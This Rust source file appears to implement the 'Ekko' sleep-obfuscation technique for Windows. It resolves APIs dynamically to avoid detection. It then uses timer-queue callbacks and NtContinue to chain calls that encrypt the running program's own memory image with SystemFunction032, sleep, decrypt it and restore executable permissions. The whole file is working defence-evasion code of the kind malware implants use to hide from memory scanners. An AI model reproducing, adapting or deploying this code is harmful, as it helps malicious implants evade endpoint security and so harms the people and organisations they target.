#![allow(non_snake_case)]
use std::{
    ffi::c_void,
    ptr::{null, null_mut},
};
use windows_sys::Win32::{
    Foundation::HANDLE,
    System::{
        Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
        Memory::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
        SystemServices::IMAGE_DOS_HEADER,
        Threading::{WAITORTIMERCALLBACK, WT_EXECUTEINTIMERTHREAD},
    },
};

#[repr(C)]
struct UString {
    length: u32,
    maximum_length: u32,
    buffer: *mut u16,
}

#[derive(Clone, Copy)]
#[repr(align(16))]
struct ProperlyAlignedContext(pub CONTEXT);

impl core::ops::Deref for ProperlyAlignedContext {
    type Target = CONTEXT;
    fn deref(&self) -> &CONTEXT {
        &self.0
    }
}

impl core::ops::DerefMut for ProperlyAlignedContext {
    fn deref_mut(&mut self) -> &mut CONTEXT {
        &mut self.0
    }
}

//will put imports here, but only going to add them as needed, cause I suspect there is a lot of unused imports in the original code
use ntapi::ntldr::{LdrGetDllHandle, LdrGetProcedureAddress};
use ntapi::ntrtl::{RtlInitUnicodeString, RtlUnicodeStringToAnsiString};

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

use winapi::ctypes::c_void as winapi_c_void;
use winapi::shared::minwindef::{FARPROC, HMODULE};
use winapi::shared::ntdef::{STRING, UNICODE_STRING};
use winapi::shared::ntstatus::STATUS_SUCCESS;
//end imports

//functions for dynamic loading of other functions

fn ldr_get_dll(dll_name: &str) -> HMODULE {
    let mut handle: *mut winapi_c_void = std::ptr::null_mut();
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let dll_name_wide: Vec<u16> = OsStr::new(dll_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        RtlInitUnicodeString(&mut unicode_string, dll_name_wide.as_ptr());
        let status = LdrGetDllHandle(
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut unicode_string as *mut UNICODE_STRING,
            &mut handle,
        );
        if status != STATUS_SUCCESS || handle.is_null() {
            return std::ptr::null_mut();
        }
    }
    handle as HMODULE
}

fn ldr_get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    let mut func: *mut winapi_c_void = std::ptr::null_mut();
    let mut ansi_string = STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let fn_name_wide: Vec<u16> = OsStr::new(fn_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        RtlInitUnicodeString(&mut unicode_string, fn_name_wide.as_ptr());
        RtlUnicodeStringToAnsiString(&mut ansi_string, &unicode_string, 1);
        let status = LdrGetProcedureAddress(
            dll as *mut winapi_c_void,
            &mut ansi_string as *mut STRING,
            0,
            &mut func,
        );
        if status != STATUS_SUCCESS || func.is_null() {
            return std::ptr::null_mut();
        }
    }
    func as FARPROC
}

pub fn ekko(sleep_time: u32, key_buf: &mut Vec<u8>) {
    let mut h_new_timer: HANDLE = 0;
    let mut old_protect: u32 = 0;

    // Load the kernel32.dll and ntdll.dll libraries.
    let kernel32 = ldr_get_dll("kernel32.dll");
    if kernel32.is_null() {
        panic!("Failed to load kernel32.dll");
    }

    let ntdll = ldr_get_dll("ntdll.dll");
    if ntdll.is_null() {
        panic!("Failed to load ntdll.dll");
    }

    // Get the addresses of the LoadLibraryA and GetProcAddress functions from kernel32.dll.
    let load_library_a: unsafe extern "system" fn(lpLibFileName: *const i8) -> HMODULE =
        unsafe { std::mem::transmute(ldr_get_fn(kernel32, "LoadLibraryA")) };

    // Load the Advapi32.dll library.
    let advapi32 = unsafe { load_library_a("Advapi32.dll\0".as_ptr() as *const i8) };
    if advapi32.is_null() {
        panic!("Failed to load Advapi32.dll");
    }

    //get the address of CreateEventW

    let create_event_w: unsafe extern "system" fn(
        lpEventAttributes: *mut c_void,
        bManualReset: i32,
        bInitialState: i32,
        lpName: *const u16,
    ) -> HANDLE = unsafe { std::mem::transmute(ldr_get_fn(kernel32, "CreateEventW")) };

    let h_event = unsafe { create_event_w(std::ptr::null_mut(), 0, 0, null()) };

    if h_event == 0 {
        panic!("[!] CreateEventW failed with error");
    }

    let EvntStart = unsafe { create_event_w(std::ptr::null_mut(), 0, 0, null()) };
    let EvntDelay = unsafe { create_event_w(std::ptr::null_mut(), 0, 0, null()) };

    // Get the address of CreateTimerQueue from kernel32.dll.
    let create_timer_queue: unsafe extern "system" fn() -> HANDLE =
        unsafe { std::mem::transmute(ldr_get_fn(kernel32, "CreateTimerQueue")) };

    // Create a new timer queue.
    let h_timer_queue = unsafe { create_timer_queue() };

    if h_timer_queue == 0 {
        panic!("[!] CreateTimerQueue failed with error");
    }

    // Get the address of GetModuleHandleA from kernel32.dll.
    let get_module_handle_a: unsafe extern "system" fn(lpModuleName: *const i8) -> HMODULE =
        unsafe { std::mem::transmute(ldr_get_fn(kernel32, "GetModuleHandleA")) };

    // Get the base address of the current module.
    let image_base = unsafe { get_module_handle_a(null_mut()) };
    //let image_base = unsafe { GetModuleHandleA(null_mut()) };
    let dos_header = image_base as *mut IMAGE_DOS_HEADER;
    let nt_headers =
        unsafe { (dos_header as u64 + (*dos_header).e_lfanew as u64) as *mut IMAGE_NT_HEADERS64 };
    let image_size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage };

    let key = UString {
        length: key_buf.len() as u32,
        maximum_length: key_buf.len() as u32,
        buffer: key_buf.as_mut_ptr() as _,
    };

    let mut data = UString {
        length: image_size as u32,
        maximum_length: image_size as u32,
        buffer: image_base as _,
    };

    // Get the address of RtlCaptureContext from ntdll.dll.
    let rtl_capture_context: unsafe extern "system" fn(ctx: *mut CONTEXT) =
        unsafe { std::mem::transmute(ldr_get_fn(ntdll, "RtlCaptureContext")) };

    let nt_continue: unsafe extern "system" fn(ctx: *mut CONTEXT, inc: i32) =
        unsafe { std::mem::transmute(ldr_get_fn(ntdll, "NtContinue")) };

    let nt_signalandwaitforsingleobject: unsafe extern "system" fn(
        SignalObject: u32,
        WaitObject: u32,
        Alertable: bool,
        Timeout: *mut u16,
    ) = unsafe { std::mem::transmute(ldr_get_fn(ntdll, "NtSignalAndWaitForSingleObject")) };

    let system_function032: unsafe extern "system" fn(data: *mut UString, key: *const UString) =
        unsafe { std::mem::transmute(ldr_get_fn(advapi32, "SystemFunction032")) };

    let virtual_protect: unsafe extern "system" fn(
        lpAddress: *mut c_void,
        dwSize: usize,
        flNewProtect: u32,
        lpflOldProtect: *mut u32,
    ) = unsafe { std::mem::transmute(ldr_get_fn(kernel32, "VirtualProtect")) };

    let wait_for_single_object: unsafe extern "system" fn(hHandle: HANDLE, dwMilliseconds: u32) =
        unsafe { std::mem::transmute(ldr_get_fn(kernel32, "WaitForSingleObject")) };

    let wait_for_single_objectex: unsafe extern "system" fn(
        hHandle: HANDLE,
        dwMilliseconds: u32,
        bAlertable: bool,
    ) -> u32 = unsafe { std::mem::transmute(ldr_get_fn(kernel32, "WaitForSingleObjectEx")) };

    let set_event: unsafe extern "system" fn(hEvent: HANDLE) -> i32 =
        unsafe { std::mem::transmute(ldr_get_fn(kernel32, "SetEvent")) };

    let rtl_capture_context_ptr =
        unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(rtl_capture_context) };

    let nt_continue_ptr = unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(nt_continue) };
    //let nt_continue_ptr = unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(nt_continue) };

    let delete_timer_queue: unsafe extern "system" fn(TimerQueue: HANDLE) =
        unsafe { std::mem::transmute(ldr_get_fn(kernel32, "DeleteTimerQueue")) };

    let ctx_thread = unsafe { std::mem::zeroed::<ProperlyAlignedContext>() };

    let create_timer_queue_timer: unsafe extern "system" fn(
        phNewTimer: *mut HANDLE,
        TimerQueue: HANDLE,
        Callback: WAITORTIMERCALLBACK,
        Parameter: *const winapi_c_void,
        DueTime: u32,
        Period: u32,
        Flags: u32,
    ) -> i32 = unsafe { std::mem::transmute(ldr_get_fn(kernel32, "CreateTimerQueueTimer")) };

    let result = unsafe {
        create_timer_queue_timer(
            &mut h_new_timer,
            h_timer_queue,
            rtl_capture_context_ptr,
            &ctx_thread as *const _ as *const winapi::ctypes::c_void,
            0,
            0,
            WT_EXECUTEINTIMERTHREAD,
        )
    };

    if result != 0 {

        unsafe { wait_for_single_object(h_event, 0x32) };

        let mut rop_prot_rw = ctx_thread;
        let mut rop_mem_enc = ctx_thread;
        let mut rop_delay = ctx_thread;
        let mut rop_mem_dec = ctx_thread;
        let mut rop_prot_rx = ctx_thread;
        let mut rop_set_evt = ctx_thread;
        let mut rop_WaitForSingleObjectEx = ctx_thread;

        rop_WaitForSingleObjectEx.Rsp -= 8;
        rop_WaitForSingleObjectEx.Rip = wait_for_single_objectex as u64;
        rop_WaitForSingleObjectEx.Rcx = EvntStart as *const c_void as u64;
        rop_WaitForSingleObjectEx.Rdx = 0xFFFFFFFF as u64;
        rop_WaitForSingleObjectEx.R8 = false as u64;

        rop_prot_rw.Rsp -= 8;
        rop_prot_rw.Rip = virtual_protect as u64;
        rop_prot_rw.Rcx = image_base as *const c_void as u64;
        rop_prot_rw.Rdx = image_size as u64;
        rop_prot_rw.R8 = PAGE_READWRITE as u64;
        rop_prot_rw.R9 = &mut old_protect as *mut _ as u64;

        rop_mem_enc.Rsp -= 8;
        rop_mem_enc.Rip = system_function032 as u64;
        rop_mem_enc.Rcx = &mut data as *mut _ as u64;
        rop_mem_enc.Rdx = &key as *const _ as u64;

        rop_delay.Rsp -= 8;
        rop_delay.Rip = wait_for_single_object as u64;
        rop_delay.Rcx = -1 as isize as u64;
        rop_delay.Rdx = sleep_time as u64;

        rop_mem_dec.Rsp -= 8;
        rop_mem_dec.Rip = system_function032 as u64;
        rop_mem_dec.Rcx = &mut data as *mut _ as u64;
        rop_mem_dec.Rdx = &key as *const _ as u64;

        rop_prot_rx.Rsp -= 8;
        rop_prot_rx.Rip = virtual_protect as u64;
        rop_prot_rx.Rcx = image_base as *const c_void as u64;
        rop_prot_rx.Rdx = image_size as u64;
        rop_prot_rx.R8 = PAGE_EXECUTE_READWRITE as u64;
        rop_prot_rx.R9 = &mut old_protect as *mut _ as u64;

        rop_set_evt.Rsp -= 8;
        rop_set_evt.Rip = set_event as u64;
        rop_set_evt.Rcx = EvntDelay as u64;

        println!("[+] Queue timers");

        unsafe {
            create_timer_queue_timer(
                &mut h_new_timer,
                h_timer_queue,
                nt_continue_ptr,
                &rop_WaitForSingleObjectEx as *const _ as *const _,
                100,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );

            create_timer_queue_timer(
                &mut h_new_timer,
                h_timer_queue,
                nt_continue_ptr,
                &rop_prot_rw as *const _ as *const _,
                100,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );

            create_timer_queue_timer(
                &mut h_new_timer,
                h_timer_queue,
                nt_continue_ptr,
                &rop_mem_enc as *const _ as *const _,
                200,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );

            create_timer_queue_timer(
                &mut h_new_timer,
                h_timer_queue,
                nt_continue_ptr,
                &rop_delay as *const _ as *const _,
                300,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );

            create_timer_queue_timer(
                &mut h_new_timer,
                h_timer_queue,
                nt_continue_ptr,
                &rop_mem_dec as *const _ as *const _,
                400,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );

            create_timer_queue_timer(
                &mut h_new_timer,
                h_timer_queue,
                nt_continue_ptr,
                &rop_prot_rx as *const _ as *const _,
                500,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );

            create_timer_queue_timer(
                &mut h_new_timer,
                h_timer_queue,
                nt_continue_ptr,
                &rop_set_evt as *const _ as *const _,
                600,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );

            println!("[+] Wait for hEvent");

            nt_signalandwaitforsingleobject(EvntStart as u32, EvntDelay as u32, false, null_mut());
            println!("[+] Finished waiting for event");
        }
    }

    unsafe { delete_timer_queue(h_timer_queue) };
}
